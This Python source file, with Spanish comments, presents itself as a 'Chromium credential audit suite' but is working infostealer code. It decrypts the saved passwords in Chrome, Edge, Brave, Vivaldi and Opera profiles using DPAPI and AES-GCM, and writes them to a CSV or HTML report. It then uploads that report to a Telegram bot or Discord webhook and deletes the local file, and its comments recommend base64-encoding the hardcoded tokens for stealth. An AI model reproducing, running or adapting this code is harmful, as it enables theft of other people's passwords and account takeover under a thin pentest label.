import os
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
import logging
import argparse
import requests
from pathlib import Path
from datetime import datetime

# =========================================================================
# 🔑 CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para sigilo)
# =========================================================================
# Tip: Usa un convertidor Online de 'Plain Text to Base64' para estos campos.
# Ej (Base64): "MTIzNDU2Nzg5MDpBQkMtREVGM..."
HARDCODED_TG_TOKEN = "" # Token de Telegram (B64)
HARDCODED_TG_ID = ""    # Chat ID (B64)
HARDCODED_DS_WEBHOOK = "" # Discord Webhook (B64)
# =========================================================================

def safe_b64_decode(val):
    """Decodifica Base64 solo si tiene contenido, de lo contrario devuelve el original."""
    if not val: return ""
    try:
        return base64.b64decode(val).decode('utf-8')
    except:
        return val # Si no es B64 válido, devolvemos tal cual (fallback)

# Condicional para win32crypt (solo Windows)
try:
    import win32crypt
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

# Configuración de Logging profesional
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("pentest_audit.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Reporte de Auditoría Chromium</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 40px; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; word-break: break-all; }
        th { background-color: #3498db; color: white; }
        tr:hover { background-color: #f1f1f1; }
        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
        .chrome { background-color: #ffeb3b; color: #333; }
        .edge { background-color: #03a9f4; color: white; }
        .brave { background-color: #ff5722; color: white; }
        .opera { background-color: #f44336; color: white; }
        .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Auditoría de Credenciales Chromium</h1>
        <p>Generado el: {{date}} | Total: {{total}} credenciales</p>
        <table>
            <thead>
                <tr>
                    <th>Navegador</th>
                    <th>Perfil</th>
                    <th>URL</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                </tr>
            </thead>
            <tbody>
                {{rows}}
            </tbody>
        </table>
        <div class="footer">Suite de Auditoría Profesional - Uso bajo responsabilidad ética</div>
    </div>
</body>
</html>
"""

class Exfiltrator:
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook

    def send_to_telegram(self, file_path):
        if not self.telegram_token or not self.telegram_chat_id: return False
        url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                requests.post(url, data={'chat_id': self.telegram_chat_id}, files={'document': f})
            logger.info("Exfiltración vía Telegram exitosa.")
            return True
        except Exception as e: logger.error(f"Falla Telegram: {e}")
        return False

    def send_to_discord(self, file_path):
        if not self.discord_webhook: return False
        try:
            with open(file_path, 'rb') as f:
                requests.post(self.discord_webhook, files={'file': f})
            logger.info("Exfiltración vía Discord exitosa.")
            return True
        except Exception as e: logger.error(f"Falla Discord: {e}")
        return False

class ChromiumDecryptor:
    def __init__(self):
        self.local = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming = Path(os.environ.get('APPDATA', ''))
        self.browsers = {
            "Chrome": self.local / "Google/Chrome/User Data",
            "Edge": self.local / "Microsoft/Edge/User Data",
            "Brave": self.local / "BraveSoftware/Brave-Browser/User Data",
            "Vivaldi": self.local / "Vivaldi/User Data",
            "Opera": self.roaming / "Opera Software/Opera Stable",
            "Opera GX": self.roaming / "Opera Software/Opera GX Stable"
        }

    def get_key(self, path):
        ls = path / "Local State"
        if not ls.exists(): return None
        try:
            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
        except: return None

    def decrypt(self, text, key):
        try:
            cipher = AES.new(key, AES.MODE_GCM, text[3:15])
            return cipher.decrypt(text[15:-16]).decode()
        except: return "[Error]"

    def audit(self, fmt="csv", out="report"):
        data = []
        for name, path in self.browsers.items():
            if not path.exists(): continue
            key = self.get_key(path)
            if not key: continue
            profs = [p for p in path.iterdir() if p.is_dir() and (p.name=="Default" or p.name.startswith("Profile"))] or [path]
            for p in profs:
                db = p / "Login Data"
                if not db.exists(): continue
                tmp = Path("tmp.db")
                try:
                    shutil.copy2(db, tmp)
                    c = sqlite3.connect(tmp).cursor()
                    c.execute("SELECT action_url, username_value, password_value FROM logins")
                    for row in c.fetchall():
                        if row[0] and row[1] and row[2]:
                            data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
                    c.close()
                except: pass
                finally: 
                    if tmp.exists(): tmp.unlink()

        final_out = f"{out}.{fmt}"
        if fmt == "csv":
            with open(final_out, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f); w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                w.writerows(data)
        elif fmt == "html":
            rows_html = ""
            for r in data:
                rows_html += f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{r[0]}</span></td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td></tr>"
            html = HTML_TEMPLATE.replace("{{rows}}", rows_html).replace("{{total}}", str(len(data))).replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M"))
            with open(final_out, "w", encoding='utf-8') as f: f.write(html)
        
        return len(data), final_out

def main():
    parser = argparse.ArgumentParser(description="Auditor-Chromium Final Suite")
    parser.add_argument("-f", "--format", choices=["csv", "html"], default="html")
    parser.add_argument("-o", "--output", default="audit_report")
    
    # 🚀 Abreviaturas (Alias) para uso manual rápido
    parser.add_argument("-t", "--telegram-token", default=safe_b64_decode(HARDCODED_TG_TOKEN), help="Token del bot (TG)")
    parser.add_argument("-c", "--telegram-chatid", default=safe_b64_decode(HARDCODED_TG_ID), help="Chat ID personal (TG)")
    parser.add_argument("-d", "--discord", default=safe_b64_decode(HARDCODED_DS_WEBHOOK), help="Webhook URL (Discord)")
    
    parser.add_argument("--no-wipe", action="store_true", help="Desactiva el auto-borrado")

    args = parser.parse_args()
    
    # Soporte Universal Base64 (Manual + Hardcoding)
    token = safe_b64_decode(args.telegram_token)
    chatid = safe_b64_decode(args.telegram_chatid)
    discord = safe_b64_decode(args.discord)

    logger.info("Iniciando Suite de Auditoría con soporte universal Base64...")
    
    count, final_file = ChromiumDecryptor().audit(args.format, args.output)
    logger.info(f"Escaneo finalizado: {count} credenciales extraídas.")

    if count > 0:
        exf = Exfiltrator(token, chatid, discord)
        if token and chatid: exf.send_to_telegram(final_file)
        if discord: exf.send_to_discord(final_file)
        if not args.no_wipe and (args.telegram_token or args.discord):
            Path(final_file).unlink()

if __name__ == "__main__":
    main()
